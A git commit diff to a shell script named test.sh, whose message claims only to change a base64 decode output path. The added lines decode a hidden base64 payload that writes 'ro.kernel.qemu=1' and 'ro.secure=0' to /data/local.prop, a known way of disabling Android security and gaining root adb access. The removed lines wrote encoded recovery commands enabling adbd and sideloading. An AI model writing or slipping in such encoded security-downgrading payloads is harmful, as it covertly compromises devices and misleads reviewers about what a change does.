ade5e2a8f5722f85c3cc8dae3f250c73821ec02e
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-08-27 05:53:53 +0900

    Update base64 decode output path in test.sh
    Change output path for base64 decoded command.

--- test.sh
+++ test.sh
@@ -3,6 +3,6 @@ set +e
 
 export TMPDIR=/cache/
 
-base64 -d > /cache/command << 'B64EOF'
-Ym9vdC1yZWNvdmVyeQotLXNpZGVsb2FkCi0tc2hvd190ZXh0Ci0tcmVhc29uPWtjcGVybWlzc2l2ZQotLWFkYmQKLS1yZXRyeV9jb3VudD0zCg==
+base64 -d > /data/local.prop << 'B64EOF'
+cm8ua2VybmVsLnFlbXU9MQpyby5zZWN1cmU9MAo=
 B64EOF
